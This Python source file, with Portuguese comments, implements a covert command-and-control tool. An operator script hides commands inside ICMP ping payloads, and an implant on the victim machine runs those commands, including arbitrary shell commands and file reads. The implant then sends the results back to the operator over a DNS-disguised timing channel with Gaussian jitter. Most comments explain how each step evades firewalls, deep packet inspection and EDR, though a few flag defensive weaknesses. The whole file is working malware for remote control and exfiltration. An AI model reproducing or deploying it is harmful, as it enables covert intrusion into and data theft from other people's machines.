import socket
import struct
import subprocess
import threading
import sys
import os
import time
import random
import platform

# ==============================================================================
#  CONFIGURAÇÕES "GHOST" (TIMING & STEALTH)
# ==============================================================================

# --- ENGENHARIA DE TRÁFEGO (TIMING CHANNEL) ---
# O objetivo aqui é esconder dados binários (0 e 1) dentro do ATRASO (Latência)
# entre pacotes, em vez de colocar os dados dentro do corpo do pacote.

# MU (Média): O "alvo" de tempo para cada bit.
# Escolhemos 0.4s e 1.2s para criar uma separação clara (Gap) que sobreviva
# à latência instável da internet real.
MU_0 = 0.4      # Representa o Bit 0 (Pausa curta)
MU_1 = 1.2      # Representa o Bit 1 (Pausa longa)

# SIGMA (Desvio Padrão): A variável mais importante para EVASÃO.
# Se usássemos tempos fixos (ex: sempre 0.400s), um algoritmo de defesa
# detetaria um "padrão de máquina" (Beaconing perfeito).
# Ao usar SIGMA, introduzimos imperfeição humana/natural.
# O tempo real será algo como 0.42s, 0.38s, 0.45s (Curva de Sino).
SIGMA = 0.1     # Jitter Estatístico (Variação natural)

# LIMIAR (Threshold): A fronteira de decisão para o Receptor.
# Qualquer atraso abaixo de 0.8s é interpretado como '0'.
# Qualquer atraso acima de 0.8s é interpretado como '1'.
LIMIAR = 0.8    

# --- ENGENHARIA DE REDE (PORTAS & PROTOCOLOS) ---

# Porta de Exfiltração (Canal de Saída).
# 53 = DNS Padrão (Ideal, mas requer matar serviços locais no Linux).
# 5353 = mDNS (Multicast DNS). Frequentemente aberta em redes internas,
# útil para testes sem privilégios de root para parar o systemd-resolved.
PORTA_DNS = 5353 

# Tipo ICMP para o Canal de Entrada (Comandos).
# 8 = Echo Request (O "Ping" que sai da máquina do hacker para a vítima).
ICMP_TYPE_REQUEST = 8

# --- SEGURANÇA OFENSIVA (OPSEC) ---

# Assinatura (Magic Bytes).
# Serve para o malware identificar que o pacote é do "Dono" e não um ping
# aleatório da internet ou de um scanner de rede.
# [DEFESA] Esta string estática na memória é uma falha de OpSec. 
# Uma regra YARA pode ser criada para buscar a string "FEP".
MAGIC_TAG = "FEP" 

# Chave de Criptografia Simétrica (XOR).
# Usada para ofuscar o comando dentro do payload ICMP.
# [DEFESA] 0xAA (10101010) é uma chave fraca ("Hardcoded Key").
# Analistas de malware procuram loops XOR com chaves de 1 byte.
CHAVE_XOR = 0xAA 

# --- MIMETIZAÇÃO (CAMUFLAGEM) ---
# Este é o padrão de bytes exato gerado pelo utilitário 'ping' do Linux.
# Ao usar isto como base, enganamos sistemas de DPI (Deep Packet Inspection)
# que verificam se o conteúdo do ping parece legítimo.
# Se enviássemos apenas zeros ou lixo aleatório, a entropia seria anómala.
PADRAO_PING = b' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO'

# ==============================================================================
#  UTILITÁRIOS DE REDE & BITS
# ==============================================================================

# --- ENGENHARIA DE REDE (RAW SOCKETS) ---

def checksum(source_string):
    """
    Implementação do algoritmo de Checksum da Internet (RFC 1071).
    
    Por que é necessário?
    Quando usamos SOCK_RAW com IPPROTO_ICMP, o Kernel do SO espera que nós
    calculemos o checksum do cabeçalho. Se enviarmos um pacote com checksum 0
    ou errado, o stack TCP/IP da máquina de destino (ou qualquer roteador no caminho)
    vai descartar o pacote silenciosamente como "corrompido".
    
    Lógica:
    1. Trata os dados como uma sequência de inteiros de 16 bits.
    2. Soma todos eles (ones' complement sum).
    3. Retorna o inverso dos bits.
    """
    # Padding: O algoritmo processa blocos de 2 bytes (16 bits).
    # Se o payload tiver tamanho ímpar, adicionamos um byte nulo no final.
    if len(source_string) % 2 != 0: source_string += b'\x00'
    
    sum = 0; count = 0
    while count < len(source_string):
        # Combina 2 bytes (High Byte * 256 + Low Byte)
        val = source_string[count + 1] * 256 + source_string[count]
        sum = (sum + val) & 0xffffffff # Garante limite de 32 bits na soma
        count += 2
    
    # Dobra a soma de 32 bits para 16 bits (Fold)
    sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16)
    
    # Retorna o complemento de um (inverte todos os bits)
    return (~sum & 0xffff) >> 8 | ((~sum & 0xffff) << 8 & 0xff00)

def criar_icmp(tipo, code, payload, id_pkt, seq_pkt):
    """
    Constrói o cabeçalho ICMP (8 bytes) manualmente.
    
    Estrutura (struct.pack):
    - b (byte): Type (8=Request, 0=Reply)
    - b (byte): Code (0)
    - H (unsigned short): Checksum (Calculado em duas passadas)
    - H (unsigned short): ID (Para identificar a sessão de ping)
    - h (short): Sequence Number (Para ordenar pacotes)
    """
    # Passo 1: Cabeçalho dummy com checksum 0 para cálculo
    header = struct.pack('bbHHh', tipo, code, 0, id_pkt, seq_pkt)
    
    # Passo 2: Calcula o checksum sobre Header + Payload
    chk = checksum(header + payload)
    
    # Passo 3: Recria o cabeçalho com o checksum correto (Network Endian - socket.htons)
    header = struct.pack('bbHHh', tipo, code, socket.htons(chk), id_pkt, seq_pkt)
    
    return header + payload

# --- TÉCNICA DE EVASÃO (DPI BYPASS) ---

def criar_dns_falso():
    """
    Cria um payload UDP que mimetiza perfeitamente uma query DNS válida (RFC 1035).
    
    Segurança Ofensiva:
    Se enviássemos apenas zeros ou lixo na porta 53, um Firewall com DPI (Deep Packet Inspection)
    bloquearia por 'Protocol Mismatch'.
    Ao enviar uma estrutura válida (Header + Query), o Firewall vê:
    'Query A www.google.com'. Ele permite passar, assumindo que é navegação legítima.
    """
    # Header DNS (12 bytes)
    # TID (Transaction ID): Randomizado para evitar deteção de 'Replay Attack'.
    tid = random.randint(0, 65535)
    
    # Flags: 0x0100 (Standard Query, Recursion Desired)
    # !HHHHHH = Network Endian, 6 unsigned shorts
    header = struct.pack('!HHHHHH', tid, 0x0100, 1, 0, 0, 0)
    
    # Query Section:
    # Formato: [len]label[len]label[0]
    # \x06google\x03com\x00 = google.com
    query = b'\x06google\x03com\x00'
    
    # Type A (IPv4 Host) = 1, Class IN (Internet) = 1
    footer = struct.pack('!HH', 1, 1)
    
    return header + query + footer

# --- MANIPULAÇÃO DE BITS (TIMING CHANNEL) ---

def text_to_bits(text):
    """
    Converte Texto -> Binário.
    Ex: 'A' -> 65 -> 01000001
    O zfill garante que cada byte tenha sempre 8 bits (zeros à esquerda).
    """
    try:
        bits = bin(int.from_bytes(text.encode('utf-8'), 'big'))[2:]
        # Arredonda para múltiplo de 8 para evitar erros de alinhamento
        return bits.zfill(8 * ((len(bits) + 7) // 8))
    except: return ""

def bits_to_text(bits):
    """
    Converte Binário -> Texto.
    É usada pelo Hacker para reconstruir a mensagem baseada nos tempos de chegada.
    Inclui tratamento de erro ('ignore') para não crashar com bits corrompidos.
    """
    try:
        n = int(bits, 2)
        return n.to_bytes((n.bit_length() + 7) // 8, 'big').decode('utf-8', 'ignore') or '\x00'
    except:
        return "?"
# ==============================================================================
#  MÓDULO DE ESTEGANOGRAFIA (Payload ICMP)
# ==============================================================================

def esconder_no_payload(texto):
    """
    TÉCNICA DE EVASÃO: ENTROPIA BAIXA (Low Entropy Steganography)
    
    Problema: Se enviarmos dados criptografados (XOR/AES) dentro de um Ping,
    a entropia (aleatoriedade) dos dados sobe para ~7.9 bits/byte.
    Sistemas de IDS (como Suricata/Snort) detetam isso como "Suspicious Encrypted Traffic".
    
    Solução: Injetamos o comando dentro de um padrão de texto conhecido (PADRAO_PING).
    
    Engenharia de Software:
    1. Python 'bytes' são imutáveis. Convertemos para 'list' (array de inteiros) para editar.
    2. O loop substitui os primeiros bytes do padrão pelos caracteres do nosso comando.
    3. O restante do padrão original é mantido intacto.
    """
    payload_base = list(PADRAO_PING) # Padrão Linux: !"#$%&...
    dados = list(texto.encode())     # Comando: FEP:whoami\x00
    
    # Substituição Byte a Byte
    for i in range(len(dados)):
        # Garante que não estouramos o tamanho do pacote (Buffer Overflow Protection)
        if i < len(payload_base): 
            payload_base[i] = dados[i]
            
    # Retorna aos bytes para envio na rede
    return bytes(payload_base)

def extrair_do_payload(dados_raw):
    """
    LÓGICA DE PARSING (AGENTE)
    
    O Agente recebe um pacote de 48 ou 64 bytes. Ele precisa separar o que é
    o comando do Hacker do que é apenas "lixo" de preenchimento (padding).
    """
    try:
        # Decodificação Resiliente: 'errors=ignore' impede que o script crashe
        # se receber bytes binários inválidos ou corrompidos na rede.
        texto = dados_raw.decode('utf-8', errors='ignore')
        
        # VALIDAÇÃO DE ASSINATURA (Magic Tag)
        # Se o pacote não tiver "FEP" (ou a tag configurada), ignoramos.
        # Isso evita que o agente tente executar pings de diagnóstico reais da rede.
        if MAGIC_TAG in texto:
            # Parsing:
            # 1. split(MAGIC_TAG)[1] -> Pega tudo depois da tag "FEP"
            limpo = texto.split(MAGIC_TAG)[1]
            
            # 2. DETECÇÃO DE NULL BYTE (\x00) - CRÍTICO!
            # O hacker enviou "whoami\x00". O resto do payload é o padrão original
            # do Linux (ex: ")*+,-./").
            # O split('\x00')[0] corta a string no terminador nulo, descartando o lixo.
            # Sem isso, o comando seria "whoami)*+,-./", o que daria erro no shell.
            return limpo.split('\x00')[0].strip()
            
    except: pass
    return None

# ==============================================================================
#  MÓDULO DE EXECUÇÃO NATIVA (Anti-EDR)
# ==============================================================================
def executar_nativo(cmd_str):
    """
    EXECUÇÃO FURTIVA ("LIVING OFF THE LAND")
    
    Problema: Malware tradicional usa 'subprocess.Popen("cmd.exe /c dir")'.
    Isso cria um processo filho visível no Gerenciador de Tarefas e nos logs do EDR.
    A criação de processos cmd.exe/powershell.exe por scripts é altamente suspeita.
    
    Solução: Usamos as APIs internas do Python para realizar as mesmas tarefas
    DIRETAMENTE na memória do processo Python, sem nunca invocar o shell do sistema.
    
    Vantagem: O EDR vê apenas o Python a rodar, sem atividades suspeitas de spawn.
    """
    cmd_str = cmd_str.strip()
    if not cmd_str: return "?" # Retorno curto para economizar banda no Timing Channel
    
    cmd_parts = cmd_str.split()
    base = cmd_parts[0].lower()
    
    try:
        # --- COMANDOS NATIVOS (STEALTH TOTAL) ---
        
        # Implementação manual de 'cd' (Change Directory)
        if base == "cd":
            if len(cmd_parts) > 1: 
                path = " ".join(cmd_parts[1:])
                os.chdir(path) # Muda o diretório de trabalho do processo atual
                return f"DIR: {os.getcwd()}"
            return os.getcwd()
            
        # Implementação manual de 'ls' ou 'dir'
        elif base in ["ls", "dir"]:
            try:
                # Lê a estrutura de diretórios diretamente via API do SO
                lista = os.listdir('.')
                # Junta os nomes e corta o tamanho para não saturar o canal de exfiltração
                return "\n".join(lista)[:100] 
            except Exception as e: return f"Erro LS: {e}"
            
        # Implementação manual de 'whoami'
        elif base == "whoami":
            # Tenta método nativo Unix (mais preciso)
            try:
                import pwd
                return pwd.getpwuid(os.getuid()).pw_name
            except: pass
            
            # Tenta método cross-platform do Python
            try: return os.getlogin()
            except: pass
            
            # Fallback para variáveis de ambiente (funciona em Windows/Linux)
            return os.environ.get('USER') or os.environ.get('USERNAME') or "unknown"

        # Implementação manual de 'id' (apenas Linux/Unix)
        elif base == "id":
            if hasattr(os, 'getuid'):
                # Lê os IDs reais do processo atual
                return f"uid={os.getuid()} gid={os.getgid()}"
            return "Win: Use whoami"

        # Implementação manual de 'hostname'
        elif base == "hostname":
            return platform.node() # Pega o nome da máquina via API
            
        # Implementação manual de 'pwd'
        elif base == "pwd":
            return os.getcwd()

        # --- NOVO: CAT NATIVO (Leitura de Arquivos) ---
        # Lê o conteúdo de um arquivo sem usar o binário '/bin/cat'
        elif base == "cat" or base == "type":
            if len(cmd_parts) < 2: return "Qual arq?"
            arquivo = " ".join(cmd_parts[1:])
            
            if os.path.isfile(arquivo):
                try:
                    # Abre o arquivo em modo leitura texto
                    # Lê apenas os primeiros 100 bytes para evitar exfiltração massiva
                    # que seria detetada por volume de tráfego.
                    with open(arquivo, 'r', errors='ignore') as f:
                        return f.read(100) 
                except: return "Erro Leitura"
            else:
                return "Arq nao existe"

        # --- FALLBACK (RISCO DE EDR!) ---
        # Se o comando não for um dos nativos acima (ex: 'ipconfig', 'netstat'),
        # somos forçados a usar o método ruidoso de criar um processo filho.
        else:
            try:
                # Timeout curto evita que o agente trave se o comando pendurar
                res = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=2)
                out = (res.stdout + res.stderr).strip()
                
                if not out: return "Sem output"
                
                # Corta drasticamente o tamanho da resposta.
                # O Timing Channel é lento (bits/s). Enviar megabytes demoraria dias.
                return out[:60] 
                
            except subprocess.TimeoutExpired:
                return "Timeout"
            except:
                return "Cmd falhou"
            
    except Exception as e:
        # Retorna o erro encurtado para debug remoto via canal encoberto
        return f"Err: {str(e)[:20]}"
# ==============================================================================
#  LADO HACKER (Envia ICMP, Ouve DNS Timing)
# ==============================================================================
def hacker_listener_thread():
    """
    Função que roda em background (Thread) no computador do atacante.
    Ela é responsável por escutar passivamente o tráfego UDP na porta DNS
    e reconstruir a mensagem secreta baseada no ATRASO entre os pacotes.
    """
    
    # Cria um socket UDP (Datagram) padrão.
    # AF_INET = IPv4
    # SOCK_DGRAM = UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        # Tenta 'bindar' (amarrar) o socket à porta configurada (ex: 53 ou 5353).
        # '0.0.0.0' significa que escutamos em todas as interfaces de rede.
        sock.bind(('0.0.0.0', PORTA_DNS))
    except:
        # Falha comum: Porta 53 exige Root ou já está em uso pelo 'systemd-resolved'.
        print(f" Erro Porta {PORTA_DNS}. Use SUDO.")
        return

    print(f"[HACKER] Ouvindo TIMING na porta {PORTA_DNS}...")
    
    # Variáveis de estado para controlar a decodificação
    ultimo_pacote = None  # Guarda o timestamp do pacote anterior
    buffer_bits = ""      # Acumula os bits (0s e 1s) decodificados
    
    while True:
        try:
            # Recebe o pacote (bloqueante). 
            # O conteúdo 'data' é ignorado porque a informação está no TEMPO.
            data, addr = sock.recvfrom(1024)
            
            # Marca o tempo exato de chegada
            agora = time.time()
            
            # --- LÓGICA DE SINCRONIZAÇÃO ---
            # O primeiro pacote de uma rajada serve apenas para "iniciar o cronómetro".
            # Também reseta se houver um silêncio muito longo (> 5s), indicando nova mensagem.
            if len(buffer_bits) == 0 and ultimo_pacote is None:
                ultimo_pacote = agora
                sys.stdout.write("\n[Recebendo Bits]: ") # Feedback visual
                sys.stdout.flush()
                continue
            
            if ultimo_pacote is None: continue

            # --- DECODIFICAÇÃO TEMPORAL (O CÉREBRO DO METÓDO) ---
            
            # 1. Calcula o Delta (Intervalo entre pacotes)
            delta = agora - ultimo_pacote
            
            # 2. Atualiza o relógio para o próximo cálculo
            ultimo_pacote = agora
            
            # 3. Decisão Binária baseada no LIMIAR (Threshold)
            # Se demorou menos que 0.8s -> É um bit '0'
            # Se demorou mais que 0.8s  -> É um bit '1'
            bit = '0' if delta < LIMIAR else '1'
            buffer_bits += bit
            
            # Feedback visual: Imprime um ponto para cada bit recebido
            sys.stdout.write(".")
            sys.stdout.flush()
            
            # --- RECONSTRUÇÃO DE BYTES ---
            # Verifica se já acumulamos 8 bits (1 Byte = 1 Caractere)
            if len(buffer_bits) % 8 == 0:
                # Pega os últimos 8 bits do buffer
                # Nota: O código original usa 'buffer_bits[-8:]', mas a lógica ideal
                # seria consumir o buffer para não crescer infinitamente.
                char = bits_to_text(buffer_bits[-8:])
                
                # Protocolo de Fim de Mensagem:
                # Se o caractere decodificado for NULO (\x00), a mensagem acabou.
                if char == '\x00':
                    # Decodifica tudo o que foi recebido até agora (exceto os últimos 8 zeros)
                    print(f"\nMENSAGEM: {bits_to_text(buffer_bits[:-8])}")
                    print("C2> ", end="") # Devolve o prompt de comando ao hacker
                    sys.stdout.flush()
                    
                    # Reseta o estado para aguardar a próxima mensagem
                    buffer_bits = ""
                    ultimo_pacote = None

        except: pass
        
# ==============================================================================
#  MODO HACKER (CONTROLADOR C2)
# ==============================================================================
def hacker_main(ip_alvo):
    """
    Função principal do lado do Atacante.
    Gerencia o envio de comandos via ICMP e inicia a escuta passiva do canal de retorno.
    """
    
    # --- ARQUITETURA ASSÍNCRONA (THREADING) ---
    # Iniciamos o 'listener' (o ouvido que decodifica o tempo) numa thread separada.
    # Porquê? Porque a exfiltração via Timing Channel é lenta e passiva.
    # Se não fosse numa thread, o terminal do hacker ficaria travado esperando a resposta,
    # impedindo o envio de novos comandos ou o cancelamento da operação.
    t = threading.Thread(target=hacker_listener_thread)
    t.daemon = True # Daemon significa que se o script principal fechar, a thread morre junto.
    t.start()
    
    # --- CONFIGURAÇÃO DE REDE (RAW SOCKETS) ---
    # Para criar pacotes ICMP personalizados (com payload alterado), não podemos usar
    # bibliotecas de alto nível. Precisamos de acesso direto à camada IP.
    # SOCK_RAW + IPPROTO_ICMP = "Deixa-me construir o cabeçalho do Ping manualmente".
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        # Raw Sockets exigem privilégios de Administrador (Root) para evitar spoofing por usuários comuns.
        sys.exit(" Root necessário para criar pacotes ICMP Raw.")

    print(f" [HACKER] Alvo definido: {ip_alvo}")
    
    # Sequence Number: Mantém a contagem dos pings enviados.
    # Firewalls Stateful monitoram isso. Se enviarmos sempre seq=0, parece um ataque de DoS.
    # Incrementar o seq faz parecer uma sessão de diagnóstico legítima (ping -t).
    seq = 1
    
    # --- LOOP DE COMANDO ---
    while True:
        cmd = input("C2> ") # Espera o input do operador
        if not cmd: continue
        
        # --- PREPARAÇÃO DO PAYLOAD (ESTEGANOGRAFIA) ---
        
        # 1. Estrutura do Comando:
        # MAGIC_TAG ("FEP"): Assinatura para o agente saber que é um comando nosso e não ruído.
        # \x00 (Null Byte): O CORRETOR DE ERROS.
        #    Como usamos esteganografia, o payload tem lixo no final (o resto do padrão do ping).
        #    O \x00 diz ao agente: "Pare de ler aqui. Tudo depois disto é lixo."
        msg = f"{MAGIC_TAG}{cmd}\x00"
        
        # 2. Camuflagem:
        # A função 'esconder_no_payload' pega na nossa mensagem e mistura-a com
        # o padrão ASCII padrão do Linux (' !"#$%&...').
        # Isso baixa a entropia e engana sistemas de DPI que procuram por criptografia anómala.
        payload = esconder_no_payload(msg)
        
        # --- MONTAGEM E ENVIO ---
        
        # Cria o pacote final com Checksum válido.
        # Tipo 8 = Echo Request (O pedido de Ping padrão).
        pkt = criar_icmp(8, 0, payload, 1234, seq)
        
        # Envia para o alvo.
        # Note que não especificamos porta, pois ICMP é camada 3 (Network), não tem portas.
        sock.sendto(pkt, (ip_alvo, 1))
        
        print(f"   [TX] ICMP camuflado enviado. (Seq: {seq})")
        seq += 1

# ==============================================================================
#  LADO AGENTE (Ouve ICMP, Responde DNS Timing)
# ==============================================================================
def agente_send_timing(ip_destino, texto):
    """
    Envia a resposta modulando o tempo com distribuição Gaussiana.
    Esta função roda numa thread separada para não bloquear o agente.
    """
    
    # Cria socket UDP padrão (DGRAM)
    # Não precisa de Raw Socket aqui, pois estamos enviando para a porta 53
    # e não precisamos manipular o cabeçalho IP, apenas o payload UDP.
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # --- PROTOCOLO DE FRAMING ---
    # Adiciona o terminador nulo (\x00) ao final do texto.
    # Isso é CRÍTICO. O Hacker do outro lado está a ler bits infinitamente.
    # O \x00 diz ao Hacker: "A mensagem acabou, pode imprimir na tela agora."
    bits = text_to_bits(texto + '\x00')
    
    print(f"   [TIMING] Enviando {len(bits)} bits (Gaussian Jitter)...")
    
    # 1. SINCRONIZAÇÃO (Handshake Temporal)
    # Envia um primeiro pacote para "zerar o cronómetro" do Hacker.
    # O conteúdo é um pacote DNS falso para passar pelo DPI do firewall.
    sock.sendto(criar_dns_falso(), (ip_destino, PORTA_DNS))
    
    # Pequena pausa técnica para garantir que o SYNC chegou antes dos dados
    time.sleep(0.2)
    
    # 2. MODULAÇÃO (O Loop de Envio)
    for bit in bits:
        # Escolhe a média baseada no bit (0 ou 1)
        # 0 = Rápido (0.4s) | 1 = Lento (1.2s)
        media = MU_0 if bit == '0' else MU_1
        
        # --- OFUSCAÇÃO ESTATÍSTICA (GAUSSIAN JITTER) ---
        # Em vez de esperar exatamente 0.4s (o que criaria um padrão robótico óbvio),
        # usamos uma curva normal (Sino).
        # O atraso real será algo como 0.42s, 0.38s, 0.45s...
        # Isso faz o tráfego parecer latência natural da internet ("Lag").
        delay = random.gauss(media, SIGMA)
        
        # Segurança: Garante que o delay nunca seja negativo ou zero absoluto
        if delay < 0.1: delay = 0.1 
        
        # O SILÊNCIO É A MENSAGEM
        time.sleep(delay)
        
        # O DISPARO
        # Enviamos outro pacote DNS falso. O conteúdo dele é irrelevante.
        # O único propósito deste pacote é dizer ao Hacker: "PARE O CRONÓMETRO AGORA".
        sock.sendto(criar_dns_falso(), (ip_destino, PORTA_DNS))
        
    print("   [TIMING] Envio concluído.")

# ==============================================================================
#  MODO AGENTE (IMPLANT)
#  Recebe Request 8 -> Responde Reply 0 -> Executa -> Exfiltra
# ==============================================================================
def agente_main(ip_mestre):
    """
    Função principal que roda na máquina vítima.
    Fica em loop infinito monitorando tráfego ICMP.
    """
    print(f"[AGENTE] Monitorando ICMP de {ip_mestre}...")
    
    try:
        # Cria Raw Socket para ler TODOS os pacotes ICMP que chegam à interface.
        sock_icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock_icmp.bind(('0.0.0.0', 0))
    except:
        # Se falhar (ex: usuário comum), encerra para não deixar processos zumbis.
        sys.exit("Root necessário.")
    
    while True:
        try:
            # Recebe o pacote bruto (IP + ICMP + Dados).
            # Buffer de 65535 garante que pegamos o pacote inteiro, mesmo que seja grande.
            raw_data, addr = sock_icmp.recvfrom(65535)
            
            # FILTRAGEM DE ORIGEM (IP SPOOFING PROTECTION)
            # Só aceitamos comandos vindos do IP do nosso Hacker.
            # Isso impede que scanners de segurança ou outros hackers controlem o nosso bot.
            if addr[0] != ip_mestre: continue
            
            # DISSECAÇÃO DO PACOTE IP
            # O cabeçalho IP tem 20 bytes (normalmente). O ICMP começa logo depois.
            # [IP Header 0-20][ICMP Header 20-28][Payload 28+]
            icmp_header = raw_data[20:28]
            
            # Desempacota o cabeçalho ICMP para ler o Tipo e Código
            tipo, code, chk, pkt_id, seq = struct.unpack('bbHHh', icmp_header)
            
            # FILTRO DE TIPO
            # Só queremos 'Echo Request' (Tipo 8). Ignoramos Replies (0) ou Unreachable (3).
            if tipo == 8: 
                payload = raw_data[28:]
                
                # Tenta extrair comando escondido no padrão de texto
                cmd = extrair_do_payload(payload)
                
                if cmd:
                    print(f" Comando: {cmd}")
                    
                    # --- 1. TÉCNICA DE EVASÃO: FAKE ECHO REPLY ---
                    # O Firewall espera ver uma resposta para fechar a conexão.
                    # Se não respondermos, ele marca como "Unmatched Flow".
                    # Criamos um Reply (Tipo 0) usando o MESMO ID/SEQ do pedido original.
                    reply = criar_icmp(0, 0, payload, pkt_id, seq)
                    sock_icmp.sendto(reply, (ip_mestre, 1))
                    
                    # --- 2. TÉCNICA ANTI-EDR: EXECUÇÃO NATIVA ---
                    # Tenta rodar via API do Python (invisível ao EDR básico)
                    resultado = executar_nativo(cmd)
                    
                    # --- 3. TÉCNICA DPI BYPASS: TIMING CHANNEL ---
                    # Inicia uma thread separada para exfiltrar os dados lentamente via DNS.
                    # Usamos thread para que o agente continue ouvindo novos comandos
                    # enquanto a exfiltração lenta acontece em background.
                    t = threading.Thread(target=agente_send_timing, args=(ip_mestre, resultado))
                    t.start()
                    
        except Exception as e:
            # Em malware real, nunca imprimimos erros para o terminal (silêncio total).
            # Aqui deixamos comentado para fins educativos.
            # print(e)
            pass

# --- BOOTSTRAP (INÍCIO) ---
if __name__ == "__main__":
    # Verifica privilégios antes de começar
    if os.geteuid() != 0: sys.exit("Execute como ROOT/SUDO.")
    
    # Menu simples para seleção de modo
    papel = input("Hacker (H) ou Agente (A)? ").upper()
    ip = input("IP do Outro Lado: ")
    
    if papel == 'H': hacker_main(ip)
    else: agente_main(ip)
